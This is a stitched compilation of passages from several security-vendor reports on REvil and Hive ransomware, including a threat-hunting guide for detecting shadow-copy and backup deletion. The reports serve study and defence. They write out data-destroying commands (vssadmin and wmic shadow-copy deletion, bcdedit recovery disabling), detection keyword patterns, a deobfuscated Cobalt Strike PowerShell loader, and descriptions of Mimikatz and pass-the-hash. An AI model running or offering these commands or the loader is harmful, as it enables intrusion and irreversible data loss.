Some of the victims have\nreportedly been compromised through a popular MSP software which led to encryption of\ntheir customers. The total number of encrypted businesses could run into thousands.\n\nREvil ransomware has been advertised on underground forums for three years and it is one\nof the most prolific RaaS operations. According to an interview with the REvil operator, the\ngang earned over $100 million from its operations in 2020. The group’s activity was first\nobserved in April 2019 after the shutdown of GandCrab, another now-defunct ransomware\ngang. More details about that gang can be found in our articles Ransomware world in 2021:\nwho, how and why and Sodin ransomware exploits Windows vulnerability and processor\narchitecture.\n\nIn this latest case, the attackers deployed a malicious dropper via the PowerShell script,\nwhich, in turn, was executed through the vendor’s agent:\n\nhttps://securelist.com/author/kaspersky/\nhttps://www.bleepingcomputer.com/news/security/revil-ransomware-hits-1-000-plus-companies-in-msp-supply-chain-attack/\nhttps://encyclopedia.kaspersky.com/glossary/ransomware-as-a-service-raas/?utm_source=securelist&utm_medium=blog&utm_campaign=termin-explanation\nhttps://securelist.com/ransomware-world-in-2021/102169/\nhttps://securelist.com/sodin-ransomware/91473/\nhttps://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/07/05113529/01-revil-attacks-msp.png\n\n\n3/12\n\nThis script disables Microsoft Defender features and then uses the certutil.exe utility to\ndecode a malicious executable (agent.exe) that drops a legitimate Microsoft binary\n(MsMpEng.exe, an older version of Microsoft Defender) and malicious library (mpsvc.dll),\nwhich is the REvil ransomware. This library is then loaded by the legitimate MsMpEng.exe by\nutilizing the DLL side-loading technique (T1574.002).\n\nExecution map for the “agent.exe” dropper – Kaspersky Cloud Sandbox\n\nUsing our Threat Intelligence service, we observed more than 5,000 attack attempts in 22\ncountries by the time of writing.\n\nhttps://attack.mitre.org/techniques/T1574/002/\nhttps://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/07/05113533/02-revil-attacks-msp.png\n\n\n4/12\n\nGeography of attack attempts (based on KSN statistics)\n\nREvil uses the Salsa20 symmetric stream algorithm for encrypting the content of files and\nthe keys for it with an elliptic curve asymmetric algorithm. Decryption of files affected by this\nmalware is impossible without the cybercriminals’ keys due to the secure cryptographic\nscheme and implementation used in the malware.\n\n Kaspersky products protect against this threat and detect it with the following names:\n\nUDS:DangerousObject.Multi.Generic\nTrojan-Ransom.Win32.Gen.gen\nTrojan-Ransom.Win32.Sodin.gen\nTrojan-Ransom.Win32.Convagent.gen\nPDM:Trojan.Win32.Generic (with Behavior Detection)\n\nhttps://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/07/05113542/03-revil-attacks-msp.png\nhttps://www.kaspersky.com/enterprise-security/wiki-section/products/behavior-based-protection\n\n\n5/12\n\nSection of Kaspersky TIP lookup page for the\n0x561CFFBABA71A6E8CC1CDCEDA990EAD4 binary\n\nThe vendor whose software was reportedly compromised, issued a special advisory which is\nbeing periodically updated.\n\nTo keep your company protected against ransomware 2.0 attacks, Kaspersky experts\nrecommend:\n\nNot exposing remote desktop services (such as RDP) to public networks unless\nabsolutely necessary and always using strong passwords for them.\nPromptly installing available patches for commercial VPN solutions providing access\nfor remote employees and acting as gateways in your network.\nAlways keeping software updated on all the devices you use to prevent ransomware\nfrom exploiting vulnerabilities.\n\nhttps://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2021/07/05113549/04-revil-attacks-msp.png\nhttps://helpdesk.kaseya.com/hc/en-gb/articles/4403440684689\n\n\n6/12\n\nFocusing your defense strategy on detecting lateral movements and data exfiltration to\nthe internet. Pay special attention to the outgoing traffic to detect cybercriminals’\nconnections. Back up data regularly. Make sure you can quickly access it in an\nemergency when needed. Use the latest Threat Intelligence information to stay aware\nof actual TTPs used by threat actors.\nUsing solutions like Kaspersky Endpoint Detection and Response and the Kaspersky\nManaged Detection and Response service which help to identify and stop attacks at\nthe early stages, before the attackers reach their main goals.\nProtecting the corporate environment and educating your employees.

The publication of a universal\ndecryptor may help victims compromised prior to the shutdown. Wednesday, September 22,\n2021 By: Counter Threat Unit Research Team\n\nhttps://www.secureworks.com/blog/revil-ransomware-reemerges-after-shutdown-universal-decryptor-released\n\n\n2/12\n\nThe ransomware landscape is constantly evolving as threat actors react to law enforcement\ninterest, excessive media scrutiny, or adverse public opinion. ‘Retirement’ claims or an\nunexplained and sudden disappearance often indicate that a threat group is rebranding,\nreorganizing, or tightening operational security. Ransomware campaigns are financially\ndriven, and the potential for profit incentivizes the threat actors to operate as long as\npossible. As demonstrated by a shutdown of GOLD SOUTHFIELD operations and\nsubsequent reemergence of a new REvil version, threat groups modify their tactics and\nmalware as necessary to address and minimize risks to their operations.\n\nREvil shutdown\n\nOn September 7, 2021, Secureworks® Counter Threat Unit™ (CTU) researchers observed\nthat the ransom payment site and victim leak site for the GOLD SOUTHFIELD threat group’s\nREvil ransomware-as-a-service (RaaS) operation had resumed responding to web requests\nafter abruptly going offline on July 13. On September 9, a newly created ‘REvil’ persona\nposted messages to the “exploit . in” underground forum explaining that the shutdown\noccurred because GOLD SOUTHFIELD spokesperson ‘UNKN’ (also known as Unknown)\nmay have been arrested and the clearnet ransom payment servers were compromised (see\nFigure 1).\n\n \n\nFigure 1. GOLD SOUTHFIELD spokesperson ‘REvil’ commenting on shutdown (translated\nfrom Russian). (Source: Bleeping Computer)\n\n \n\nReemergence with a new version\n\nOn September 9, CTU™ researchers identified a REvil sample on the VirusTotal analysis site\nthat appears to be a new version. However, it includes a version value of 2.06. REvil 2.06\nwas released in April. The latest known version as of the shutdown was REvil 2.08, which\nwas uploaded to VirusTotal on July 10. Despite the 2.06 version value, the September\nsample has a compilation timestamp of “Sat Sep 04 10:16:49 2021,” which is almost two\nmonths after the shutdown. While it is possible to timestomp a binary’s compilation\ntimestamp, analysis of previous REvil samples indicates that GOLD SOUTHFIELD does not\nmodify this value. It is highly likely that the September sample is a new version.\n\nCTU analysis and the REvil persona’s posts suggest that GOLD SOUTHFIELD was forced to\nrestore the REvil codebase from a backup of version 2.06. Changes made in versions 2.07\nand 2.08 were reverted in the analyzed September 2021 sample. For example, the original\n\nhttps://www.secureworks.com/resources/rp-prevent-ransomware-attacks-ransomware-report-2021-vol1\nhttps://www.secureworks.com/research/threat-profiles/gold-southfield\nhttps://www.secureworks.com/research/revil-sodinokibi-ransomware\nhttps://www.bbc.com/news/technology-57826851\nhttps://en.wikipedia.org/wiki/Clearnet_(networking)\nhttps://www.bleepingcomputer.com/news/security/revil-ransomware-is-back-in-full-attack-mode-and-leaking-data//\nhttps://www.virustotal.com/gui/file/ab0aa003d7238940cbdf7393677f968c4a252516de7f0699cd4654abd2e7ae83\nhttps://www.virustotal.com/gui/file/6cc78078952e991ee591e9503aca12da1f7f4d3d9175298dc11f8efd5a199540\nhttps://0xc0decafe.com/malware-analyst-guide-to-pe-timestamps/\nhttps://attack.mitre.org/techniques/T1070/006/\n\n\n3/12\n\n2.06 version includes a function to terminate prohibited services that stored its strings in an\nunencoded state (see Figure 2).\n\nFigure 2. Original REvil 2.06 use of unencoded strings. (Source: Secureworks)\n\nIn version 2.07, the malware author updated this and several other functions to store the\nstrings in an encoded state (see Figure 3). However, the September 2021 sample reverted to\nunencoded strings.\n\n \n\nFigure 3. Implementation of encoded strings in REvil 2.07. (Source: Secureworks)\nCTU analysis of the September 2021 sample revealed the following modifications that\ndistinguish it from previous versions:\n\n\n\n4/12\n\nChanges encrypted configuration storage location: Previous REvil binaries\ncontained five sections. The text, rdata, data, and reloc sections were common across\nall versions. The fifth section was randomly named and contained the RC4-encrypted\nconfiguration structure (see Figure 4).\n \n\nFigure 4. Original configuration storage format with five portable executable sections.\n(Source: Secureworks)\n \nThe September 2021 sample omits the fifth section, and the encrypted configuration\nwas moved to the beginning of the existing data section (see Figure 5). The\nconfiguration remains RC4-encrypted, and the data structure still consists of the RC4\nkey, the CRC32 hash of the encrypted configuration, the length of the configuration,\nand the encrypted configuration.\n\n\n\n5/12\n\n \n\nFigure 5. Analyzed September 2021 sample’s configuration storage format with four\nportable executable sections. (Source: Secureworks)\n \n\n\n\n6/12\n\nRemoves debug and prohibited region checks: Since its inception, REvil performed\na pre-infection check to ensure that the compromised system did not reside within the\nCommonwealth of Independent States (CIS). This validation was controlled by a ‘dbg’\nelement contained within the REvil configuration. If the malware detected a CIS region\nand the dbg configuration element was set to false, REvil did not infect the system (see\nFigure 6). This behavior was one of several characteristics that suggested the threat\nactors likely reside within a CIS region.\n\n \n\nFigure 6. Original code with debug and prohibited region checks. (Source:\nSecureworks)\n\nThis validation was removed in the September 2021 sample (see Figure 7) although\nthe dbg configuration element is still present in the configuration.\n\nFigure 7. Analyzed September 2021 sample without debug and prohibited region\nchecks. (Source: Secureworks)\nAs of this publication, it is unclear why this validation was removed. The validation\nlikely protected the malware author, as infected systems within the CIS region could\nresult in unwanted attention from local authorities. It is possible that the malware author\nremoved this check in response to public reports that describe how organizations can\nleverage this feature to prevent ransomware infections. While the threat actors\nremoved this check from the code, they instituted restrictions on which types of\norganizations affiliates could target to accomplish the same goal of avoiding\norganizations in the CIS region.\n\nhttps://www.britannica.com/topic/Commonwealth-of-Independent-States\nhttps://krebsonsecurity.com/2021/05/try-this-one-weird-trick-russian-hackers-hate/\n\n\n7/12\n\nChanges password and registry values for safe mode option: REvil 2.05\nintroduced a safe mode option. This reboot feature set the current user’s password,\nconfigured automatic logon, created RunOnce registry values to handle post-reboot\noperations, and then rebooted the system. In the September 2021 sample, the current\nuser’s password was changed from ‘DTrump4ever’ to ‘U1k$NEIq3c6Q’. The RunOnce\nregistry values used for post-reboot operations were changed from ‘*AstraZeneca’ to\n‘*Ponyaz’ and from ‘*MarineLePen’ to ‘*b2I0uo’ (see Figure 8).\n\nFigure 8. Updated safe mode registry values. (Source: Secureworks)\nRemoves persistence: The persistence logic that resumes encryption if a victim\nreboots the system during the encryption process was removed in the September 2021\nsample. The presence of persistence logic has been inconsistent across REvil\nversions.\n \nRemoves Network Discovery enablement: REvil 2.07 introduced functionality that\nattempted to enable Network Discovery by executing the following command via the\nWinExec function: netsh advfirewall firewall set rule group=”Network Discovery” new\nenable=Yes. It is possible that this functionality was not intentionally removed. If GOLD\nSOUTHFIELD restored the code from a version 2.06 backup, this feature had not yet\nbeen implemented.\n \n\nhttps://docs.microsoft.com/en-us/troubleshoot/windows-server/user-profiles-and-logon/turn-on-automatic-logon\nhttps://www.majorgeeks.com/content/page/how_to_turn_on_or_off_network_discovery.html\nhttps://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec\n\n\n8/12\n\nRemoves duplicate process termination functionality: Starting with version 1.03,\nREvil implemented two redundant functions for process termination: a thread that\ncontinuously monitored for the creation of new “prohibited” processes, and an initial\none-time scan for running processes considered to be prohibited (see Figure 9).\nProhibited processes are defined in the ‘prc’ configuration element and are typically\nprocesses that could result in resource conflicts during the encryption process (e.g.,\nsql, firefox, winword). Both functions attempted to terminate detected prohibited\nprocesses.\n\nFigure 9. Redundant process termination functions included in the original code.\n(Source: Secureworks)\n\nThe September 2021 sample does not contain the initial scan for prohibited process\ntermination. It only contains the more robust thread that continuously monitors for\nprohibited processes.\n\n\n\n9/12\n\nRemoves C2 functionality: After REvil successfully encrypts a system, it has an\noption to communicate basic details to one or more GOLD SOUTHFIELD command\nand control (C2) servers. If the ‘net’ configuration element is set to true, REvil sends\nencrypted data about the infected system, the malware’s encryption, and the malware\ninstance. CTU researchers refer to the encrypted data sent to the C2 servers as ‘stats’.\nFigure 10 shows an example of the stats data structure in its unencrypted form.\n\nFigure 10. Example of the stats data structure in its unencrypted form. (Source:\nSecureworks)\n\nWhile the ‘net’ configuration element is present in the September 2021 sample, the C2\nlogic was removed. The ‘dmn’ configuration element that stored approximately 1,200\nC2 domains was also removed.\n\nIn the September 2021 sample, the stats data is only located within the ransom note\ndropped to disk during the file encryption process. The ransom note instructs the victim\nto submit the encrypted stats string to the ransom payment site to begin the ransom\npayment and data restoration process.\n\n\n\n10/12\n\nDiscontinues clearnet ransom payment site: GOLD SOUTHFIELD traditionally\nincluded both clearnet and Tor-based ransom payment domains in its ransom notes.\nThe first REvil clearnet domain was decryptor . top, which was suspended by its\nregistrar on January 20, 2020. GOLD SOUTHFIELD switched to decryptor . cc for\napproximately a year before switching to decoder . re on January 23, 2021. As of this\npublication, the decoder . re domain does not resolve to an IP address even though\nGOLD SOUTHFIELD’s infrastructure is online. The ransom note references a\n‘secondary website’ and does not include a clearnet domain (see Figure 11).\n\nFigure 11. Ransom note without the clearnet ransom payment domain. (Source:\nSecureworks)\n \n\nUpdates registry key and values: The registry key that stores encryption-related\ninformation was changed from SOFTWARE\\BlackLivesMatter, which was introduced in\na beta version of REvil 2.04, to SOFTWARE\\XMT0qpW. The value names stored within\nthis key also changed, which is consistent with the author’s pattern of renaming registry\nvalues in each version. The value used to store the encrypted session private key was\nremoved, possibly to prevent unauthorized decryption of a victim’s files if the threat\nactor’s private keys are compromised.

During CTU analysis, the tool successfully decrypted files\nencrypted by multiple REvil versions released prior to that date. This tool is not an offline\ndecryptor. The infected system must connect to the internet to download the appropriate\ndecryption key from Bitdefender’s servers. Connecting to the internet could expose the\ncompromised organization to unintended consequences such as new infections or data loss\nif additional malware is running on the infected system. Additionally, as of this publication\nBitdefender has not disclosed if telemetry is collected from the network traffic to the\ndecryption key server and how the vendor and law enforcement might use that information.\nCTU researchers highly recommend that organizations perform their own risk assessment\nbefore using this decryption tool.\n\nBitdefender’s collaboration with law enforcement on the universal decryptor and the REvil\nspokesperson’s claims that GOLD SOUTHFIELD’s infrastructure was compromised suggest\nthat law enforcement compromised the infrastructure and confiscated the threat group’s\nprivate keys. In response, GOLD SOUTHFIELD appears to be reducing its attack surface by\neliminating clearnet infrastructure and removing unnecessary features.\n\nConclusion\n\nCTU researchers had hypothesized that GOLD SOUTHFIELD proactively shut down\noperations in response to the U.S. government’s commitment to address the ransomware\nthreat following high-profile attacks on Colonial Pipeline, JBS, and Kaseya. However, the\nREvil spokesperson’s claims suggest that the shutdown was due to law enforcement actions\nagainst the threat group and its infrastructure. The reactivation of the group’s infrastructure,\nthe emergence of a new underground forum spokesperson, and evidence of active malware\ndevelopment indicate that GOLD SOUTHFIELD has resumed operations.\n\nRansomware attacks are often opportunistic. Threat actors search for systems that have lax\nsecurity and exposed vulnerabilities. Organizations should implement good security practices\nand controls to secure their environments. Removing initial access vectors can minimize the\nrisk of a ransomware attack. It is critical that organizations implement and routinely test a 3-\n2-1 backup strategy to ensure speedy recovery in the event of a successful ransomware\nattack.\n\nContact us to learn more about proactive steps.

APT\nactors, commodity malware operators and even attackers who had never used ransomware\nbefore started picking up the trend over the last several years. In years past, attackers turned\nto ransomware to exploit an organization’s lack of a good backup plan, disaster recovery\nplan, or coax the victim into paying a ransom to maintain their operations and reduce\ndowntime. However, an unfortunate fact of ransomware infections is how rare full recovery is,\nafter payment occurs. \n\nransomware\n\nhttps://www.cyborgsecurity.com/cyborg_labs/hunting-ransomware-inhibiting-system-backup-or-recovery/\n\n\n2/7\n\n \nGiven this fact, as well as several vendors and global government organizations highly\nrecommending not paying and instead reverting to recovery options, ransomware infections\nwere becoming less impactful when relying on data encryption alone. This is where the trend\nof stealing and holding a victim’s confidential data for ransom has started to become\nprevalent amongst ransomware variants, sometimes referred to as ‘doxware.’ Ransomware\n“leak sites” are popping up regularly on the dark and clear webs. These leak sites publicly\nshame their victims and threaten to release sensitive information if their demands are not\nmet. This makes ransomware an incredibly formidable foe, requiring organizations to focus\nmore effort on detection and prevention.  \n\nFortunately for defenders, there are many common calling cards of ransomware. Cyborg\nSecurity researchers performed research and analysis on more than twenty of the top\nvariants of ransomware, many accounting for highly visible and damaging attacks. In the\nfollowing section we’ll break down one of the most common techniques employed by\nransomware, how to detect the multiple variations that are deployed, give specific\nexamples by variant and how to analyze and attribute observed activity back to the\nspecific variant. Armed with this information defenders will be able to choose the best hunt\nfor their organization that can cast a wide net with as little potential for false positives as\npossible.  \n\nInhibiting System Recovery – MITRE ATT&CK Technique T1490 \n\nThere are several methods that ransomware uses in order to inhibit system recovery, stop\nfurther recoveries, and corrupts or deletes available recovery points on a system. The most\ncommon method observed during Cyborg Security’s research was the use of vssadmin to\ndelete “Shadow Copies” from the system. Given this became nearly common place for\nransomware, developers began exploring other options such as utilizing PowerShell, wmic,\nbcdedit, net.exe and wbadmin. The utilization of these built in Windows applications is so\ncommon in ransomware, it’s nearly impossible to attribute the specific ransomware based\nsolely on the method in which it prevents system backups.  \n\nHypothesis  \n\nDynamic analysis utilizing industry leading malware sandboxes, manual analysis, EDR and\nwindows logging, it was noted in some cases, dependent on ransomware variant, process\ncreation events were not logged for each application called within the cmd.exe or\npowershell.exe command. As such searching within the command line of a PowerShell or\nCommand Shell execution must be performed to avoid missing potential attacks. During\nanalysis it was found bcdedit, wmic, vssadmin, powershell and net were all used as a form of\ninhibiting a backup from being taken or utilized for system recovery. Although several\n\nhttps://www.cyborgsecurity.com/cyborg_labs/the-rise-of-doxware-capable-ransomware/\nhttps://cta-redirect.hubspot.com/cta/redirect/7924572/e7e7c860-1390-4fe6-a3f9-0c8d05dac52b\nhttps://attack.mitre.org/techniques/T1490\n\n\n3/7\n\nvariants utilize the same technique with the same application it was found several utilized\nvariations of commands or utilized the application completely different than another, which\nalso needs to be accounted for within any generated logic.  \n\nResponse \n\nThe majority of analyzed ransomware variants did not exhibit unique deployments of this\ntechnique. As such, analysts will need to review source processes, parent processes and\nrelated process executions or creation events for further signs of a ransomware infection and\nattribute the activity to a specific ransomware. The easiest method to attribute the\nransomware variant, if it appears a successful infection is identified, is to search for file write\nevents or analyze other data from the suspected host looking for files created or modified\nwith abnormal extensions. Many ransomware variants make it easy and add the variant’s\nname as the extension, while others use a randomized string and require other artifacts for\nattribution. Other methods can include reviewing services or processes stopped or deleted\nby the ransomware binary or script. Often each variant will choose a specific set of services\nto disable, stop, delete or uninstall applications. If these methods fail, identifying the directory\nand binary name (it’s structure), combined with the already identified artifacts, can assist in\nfinal attribution.  \n\nIn-scope Ransomware Variants  \n\n•     Ako (Ranzy)\n •     Avaddon\n\n •     Conti\n •     Lockbit\n\n •     Maze\n •     Nemty (Nefilm)\n\n •     ProLock\n •     Ragnar\n\n •     RansomExx\n •     Ryuk\n\n •     Snatch\n •     Sodinokibi (REvil)\n\n •     Darkside\n •     Pysa (Mespinoza)\n\n •     Netwalker \n\nOut-of-Scope Ransomware\n\nMITRE ATT&CK also tracks a number of other ransomware families that use T1490,\nincluding\n\n\n\n4/7\n\n•     BitPaymer (S0570)\n•     H1N1 (S0132)\n•     InvisiMole  (S0260)\n•     JCry (S0389)\n•     MegaCortex  S0576)\n•     Olympic Destroyer (S0365)\n•     RobbinHood (S0400)\n•     WannaCry (S0366)   \n\nHowever, for the purposes of this analysis, these malware families will remain out-of-scope.\n\nHypothesis Summaries  \n\nBy Process Name \n\nprocessName equals any of (\"vssadmin.exe\", \"bcdedit.exe\", \"wmic.exe\", \n\"powershell.exe\", \"wbadmin.exe\")   \n\nAND  \n\ncommandLine contains any of (\"recoveryenabled no\", \"IgnoreAllFailures\", \"delete \nshadows\", \"delete systemstatebackup\", resize shadowstorage\", \"_ShadowCopy\", \n\"safeboot minimal\", \"shadowcopy /nointeractive\", \"shadowcopy delete\")  \n\n \n\nBy Command Line \n\nprocessName equals and of (\"cmd.exe\", \"powershell.exe\")   \n\nAND   \n\ncommandLine contains any of (\"vssadmin \", \"vssadmin.exe \", \"bcdedit \", \"bcdedit.exe \n\", \"wmic \", \"wmic.exe \", \"wbadmin \", \"wbadmin.exe \", \"Get-WmiObject \")   \n\nAND   \n\ncommandLine contains any of (\"recoveryenabled no\", \"IgnoreAllFailures\", \"delete \nshadows\", \"delete systemstatebackup\", resize shadowstorage\", \"_ShadowCopy\", \n\"safeboot minimal\", \"shadowcopy /nointeractive\", \"shadowcopy delete\")  \n\nExecutions by Application and Variant \n\nVSSAdmin \n\nFamilies: Ako, Avaddon, Conti, Lockbit, Ragnar, Ryuk, Netwalker \n\nvssadmin.exe Delete Shadows /All /Quiet  \n\n\n\n5/7\n\n \nFamilies: Nemty, ProLock\n\n\"C:\\Windows\\System32\\cmd.exe\"  /c vssadmin resize shadowstorage /for=C: /on=C: \n/maxsize=401MB  \n\n\"C:\\Windows\\System32\\cmd.exe\"  /c vssadmin resize shadowstorage /for=C: /on=C: \n/maxsize=unbounded  \n\n \n\nWMIC (WMI Command Line) \n\nFamilies: Ako, Avaddon, Lockbit \n\nwmic.exe SHADOWCOPY /nointeractive = \n\n \nFamilies: Lockbit, Nemty, Ragnar, Ryuk \n\nwmic  shadowcopy delete  \n\nFamilies: Maze\nAnalysis note: This command was a curious find as it’s a defense evasion technique to break\ndetections relying on the full path of wmic \n\nC:\\i\\hhwq\\jees\\..\\..\\..\\Windows\\hpn\\a\\..\\..\\system32\\s\\p\\..\\..\\wbem\\vax\\pq\\..\\..\\wmic.\n\nPowerShell \n\nFamilies: Darkside, Nemty \n\nAnalysis note: Several samples analyzed of each of these variants utilized obfuscation of the\nPowerShell command.

This is especially true for the early stages of the infection\nchain, such as the Installation phase, to detect, identify and respond as quickly as possible to\nthe potential threat. Hunting for ransomware attempting to inhibit a host’s recovery ability is\none of, if not the best methods for identifying potential ransomware attacks, post-delivery.\nThis is largely due to the limited composition of the commands to carry out the\ntechnique, and its rarity of being observed for legitimate purposes. Although hunting for this\ntechnique may not make it readily apparent which ransomware variant is lurking in your\norganization, it’s certainly one of the best bangs for your hunting and time.  \n\n\n\n7/7\n\nhttps://cta-redirect.hubspot.com/cta/redirect/7924572/7e10db25-ed3c-47d3-973d-eafc0a6af241\nThreat Hunting\n\nFramework\n\nFramework - DOWNLOAD NOW >\n\n7/7",

Multiple devices and\nfile servers were compromised and encrypted by a malicious threat group known as Hive.\n\nFirst observed in June 2021, Hive is an affiliate-based ransomware variant used by cybercriminals to conduct ransomware attacks\nagainst healthcare facilities, nonprofits, retailers, energy providers, and other sectors worldwide. Hive is built for distribution in a\nRansomware-as-a-service model that enables affiliates to utilize it as desired.\n\nThe variant uses common ransomware tactics, techniques, and procedures (TTPs) to compromise victims' devices. While taking\nlive actions, the operator disables anti-malware protections and then exfiltrates sensitive data and encrypts business files. Their\naffiliates use multiple mechanisms to compromise their victims' networks, including phishing emails with malicious attachments,\nleaked VPN credentials, and by exploiting vulnerabilities on external-facing assets. In addition, Hive places a plain-text ransom note\nthat threatens to publish the victim's data on the TOR website 'HiveLeaks' unless the victim meets the attacker's conditions.\n\nhttps://www.varonis.com/blog/hive-ransomware-analysis\nhttps://www.varonis.com/blog/ransomware-as-a-service?hsLang=en\n\n\n2/11\n\nObservation of the attack\n\nThe Forensics team observed that the actor managed to achieve its malicious goals and encrypt the environment in less than 72\nhours from the initial compromise.\n\nStage 1: ProxyShell and WebShell\n\nFirst, the attacker exploited multiple Exchange security vulnerabilities, referred to as ProxyShell. Next, the attack placed a malicious\nbackdoor script, referred to as webshell, in a publicly accessible directory on the Exchange server. These web scripts could then\nexecute malicious PowerShell code over the compromised server with SYSTEM privileges.\n\nStage 2: Cobalt Strike\n\nThe malicious PowerShell code downloaded additional stagers from a remote C2 (Command & Control) server associated with the\nCobalt Strike framework. The stagers were not written to the file system but executed in memory.\n\nStage 3: Mimikatz and Pass-The-Hash\n\nLeveraging the SYSTEM permissions, the threat actor created a new system administrator user named \"user\" and advanced to the\ncredential dumping stage, invoking Mimikatz. By stealing the domain Administrator NTLM hash and without needing to crack the\npassword, the operator managed to reuse it via Pass-The-Hash attack and take control of the domain admin account.\n\nStage 4: Scanning for sensitive information\n\nNext, the threat actor performed extensive discovery activities across the network. In addition to searching for files containing\n\"password\" in their names, observed activities included dropping network scanners and collecting the networks' IP addresses and\ndevice names, followed by RDPs to the backup servers and other critical assets.\n\nStage 5: Ransomware deployment\n\nFinally, a custom-crafted malware payload named Windows.exe was delivered and executed on various devices, leading to wide\nencryption and denial of access to files within the organization.\n\nThe payload created a plain text ransomware demand note during the encryption phase.\n\nInitial Access\n\nThe initial indicator of compromise was the successful exploitation of Microsoft Exchange via vulnerabilities known as ProxyShell.\n\nRevealed in August 2021, ProxyShell is a Remote Code Execution (RCE) vulnerability. ProxyShell involves a set of three separate\nsecurity flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.\n\nCVE-2021-34473 (Base Score: 9.8)\n\nMicrosoft Exchange Server Remote Code Execution Vulnerability.\n\nCVE-2021-34523 (Base Score: 9.8)\n\nMicrosoft Exchange Server Elevation of Privilege Vulnerability\n\nCVE-2021-31207 (Base Score: 7.2)\n\nMicrosoft Exchange Server Security Feature Bypass Vulnerability\n\nMicrosoft released patches for those three vulnerabilities in April and May 2021 as part of their \"Patch Tuesday\" releases. CVE-\n2021-34473 and CVE-2021-34523 were patched (KB5001779) In April 2021. CVE-2021-31207 was patched (KB5003435) in May.\n\nDuring the investigation, we found specific exploitation evidence of these CVEs (Common Vulnerabilities and Exposures), which\nallowed the adversary to deploy webshells successfully on the compromised server.\n\nBased on our analysis, four different IP addresses accessed the malicious files:\n\nhttps://www.varonis.com/blog/what-is-mimikatz?hsLang=en\n\n\n3/11\n\n139.60.161.228 (USA)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning\n\n139.60.161.56 (USA)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning\n\n185.70.184.8 (Netherlands)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning. Associated with Emotet, IcedID, and QBot.\n\n91.208.52.149 (Netherlands)\n\nASN: SERVERIUS-A\n\nThe following malicious files were spotted:\n\nThese file names are made of random characters that do not appear to have any significance. Attackers commonly use this\ntechnique to prevent third parties from finding the webshells online by sending HTTP requests to a list of preconstructed names that\nare part of other campaigns.\n\nThe source code of the established webshells is taken from a public git repository at\nhttps://github.com/ThePacketBender/webshells.\n\nhttps://github.com/ThePacketBender/webshells\n\n\n4/11\n\nExecution\n\nBy establishing a foothold on the compromised Exchange Server, the threat actor executed various PowerShell commands\ndesigned to download malicious files from the remote C2 server to the victim's computer. Attackers would execute the malware by\nusing commands such as Invoke-Expression (IEX) or by downloading the file content directly into the device's memory and\nexecuting it:\n\nFurther, attackers executed an additional obfuscated PowerShell script that was a part of the Cobalt Strike framework:\n\nThe Base64 encoded command contains several layers of encoding but finally decodes to the following PowerShell command:\n\n\n\n5/11\n\nfunction func_get_proc_address { \nParam ($var_module, $var_procedure)   \n$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache \n\n-And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods') \n$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] \n\n@('System.Runtime.InteropServices.HandleRef', 'string')) \nreturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object \n\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr), \n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure)) \n} \n\nfunction func_get_delegate_type { \nParam ( \n [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters, \n [Parameter(Position = 1)] [Type] $var_return_type = [Void] \n) \n\n$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object \nSystem.Reflection.AssemblyName('ReflectedDelegate')), \n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', \n$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) \n\n$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', \n[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed') \n\n$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, \n$var_parameters).SetImplementationFlags('Runtime, Managed') \n\nreturn $var_type_builder.CreateType() \n} \n\n[Byte[]]$var_code = \n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIv\n\nfor ($x = 0; $x -lt $var_code.Count; $x++) { \n$var_code[$x] = $var_code[$x] -bxor 35 \n\n} \n\nWrite-Output $var_code \n\nThe additional \"for loop\" function adds another layer of obfuscation and XORs the Base64 code with a key of 35. We successfully\nextracted the IP address of the target C2 by mimicking the process, which, unsurprisingly, turned out to be the same address we\nfound previously.\n\n\n\n6/11\n\nConverting the Base64 into a hexadecimal string and reformatting with a Python script restored the malicious file. VirusTotal\nanalysis shows 23 out of 52 antivirus detections and attributes the file to the Cobalt Strike framework.\n\nPersistence\n\nWith the provided NT AUTHORITY\\SYSTEM privileges and to maintain persistence over the compromised server, a newly crafted\naccount followed by the name \"user\" was created and added to \"Remote Desktop Users\" and \"Administrators\" groups. The user\nwas used to access multiple paths seeking \"password\" related files, RDP access to backup servers, and more.\n\nCredential Access\n\nThe threat actor used Mimikatz, a post-exploitation tool, specifically its SekurLSA's \"logonPasswords\" module, which extracts the\npasswords and NTLM hashes of the accounts logged into the system and saves the results to a text file on the local system. With\nthe administrator's NTLM hash in hand, the threat actor used the pass-the-hash technique to get highly privileged access to other\nassets in the network by launching a new command prompt on the affected system:\n\nLateral Movement\n\nLeveraging the stolen domain admin account, the actor performed RDP access requests using mstsc.exe following the parameter\n\"/v\" to multiple devices on the network, mainly searching for servers associated with the network backups and SQL servers. We\nstrongly believe that these actions were performed to confirm the ability to access the critical servers before the ransomware\n\n\n\n7/11\n\ndeployment.\n\nDiscovery\n\nA known public network scanner tool named \"SoftPerfect\" was used to perform scans over the domain assets.\n\nBy utilizing 